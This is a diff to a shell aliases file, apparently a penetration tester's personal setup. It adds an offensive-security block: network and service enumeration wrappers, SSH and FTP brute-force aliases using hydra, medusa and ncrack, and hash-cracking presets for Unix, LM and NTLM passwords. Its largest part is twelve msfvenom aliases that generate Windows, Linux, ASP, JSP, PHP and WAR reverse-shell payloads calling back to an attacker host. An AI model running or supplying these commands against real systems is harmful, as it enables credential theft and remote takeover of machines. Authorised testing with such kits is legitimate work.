@@ -291,6 +291,57 @@ alias whatismyip="curl icanhazip.com"
 
 
 ### enum_scripts ###
+export OFFKIT="/offsec/git/snare-ng"
+
+alias enum_dns_zone="$OFFKIT/Enumeration/DNS/enum-domain-zone.sh "
+alias enum_dns_bruteforce="$OFFKIT/Enumeration/DNS/enum-domain-bruteforce.sh "
+alias enum_dns_ip="$OFFKIT/Enumeration/DNS/enum-ip-sweep.sh "
+alias enum_linrpc="$OFFKIT/Enumeration/RPCUNIX/rpcinfo.sh "
+alias enum_smb_enum4linux="$OFFKIT/Enumeration/SMB/enum4linux.sh "
+alias enum_smb_nbtscan="$OFFKIT/Enumeration/SMB/nbtscan.sh "
+alias enum_smb_rpcclient="$OFFKIT/Enumeration/SMB/rpcclient.sh "
+alias enum_snmp_161="$OFFKIT/Enumeration/SNMP/onesixtyone-enum.sh"
+alias enum_snmp_check="$OFFKIT/Enumeration/SNMP/snmp-check.sh"
+alias enum_snmp_walk="$OFFKIT/Enumeration/SNMP/snmpwalk.sh"
+
+alias enum_ssh="$OFFKIT/Enumeration/SSH/ssh-enum.sh "
+alias enum_http="$OFFKIT/Enumeration/WEB/http-enum.sh "
+
+alias enum_nse_ftp="$OFFKIT/Enumeration/FTP/ftp.nse.sh "
+alias enum_nse_imap="$OFFKIT/Enumeration/IMAP/imap.nse.sh "
+alias enum_nse_pop="$OFFKIT/Enumeration/POP/pop-nse.sh "
+alias enum_nse_smb="$OFFKIT/Enumeration/SMB/smb-nse.sh "
+alias enum_nse_smtp="$OFFKIT/Enumeration/SMTP/smtp-nse.sh "
+
+alias bust_http="$OFFKIT/Enumeration/WEB/http-busting.sh "
+
+alias brute_ftp_hydra="$OFFKIT/Enumeration/FTP/ftp-bruteforce.sh "
+alias brute_ssh_medusa="$OFFKIT/Enumeration/SSH/ssh-brute-medusa.sh "
+alias brute_ssh_hydra="$OFFKIT/Enumeration/SSH/ssh-brute-hydra.sh "
+alias brute_ssh_ncrack="$OFFKIT/Enumeration/SSH/ssh-brute-ncrack.sh "
+
+alias john-unix="john --format=crypt "
+alias john-winlm="john --format=LM "
+alias john-winntlm="john --format=NTLM "
+alias smtp_vrfy="$OFFKIT/Enumeration/SMTP/smtp-auth.sh "
+alias venom_stage_win_x86="msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > shell-x86.exe"
+alias venom_stage_win_x64="msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > shell-x64.exe"
+alias venom_sless_win_x86="msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > shell-x86.exe"
+alias venom_sless_win_x64="msfvenom -p windows/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe > shell-x64.exe"
+alias venom_stage_lin_x86="msfvenom -p linux/x86/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > shell-x86.elf"
+alias venom_stage_lin_x64="msfvenom -p linux/x64/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > shell-x64.elf"
+alias venom_sless_lin_x86="msfvenom -p linux/x86/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > shell-x86.elf"
+alias venom_sless_lin_x64="msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf > shell-x64.elf"
+alias venom_asp="msfvenom -p windows/shell/reverse_tcp LHOST=$LHOST LPORT=$LPORT -f asp > shell.asp"
+alias venom_jsp="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f raw > shell.jsp"
+alias venom_php="msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw > shell.php"
+alias venom_war="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f war > shell.war"
+#todo: smb-map
+#todo: impacket
+#todo: wine/gcc
+#todo: my-ftp/http/staging-area
+
+
 ### logstash ###
 ### zeek ###
 ### zfs ###
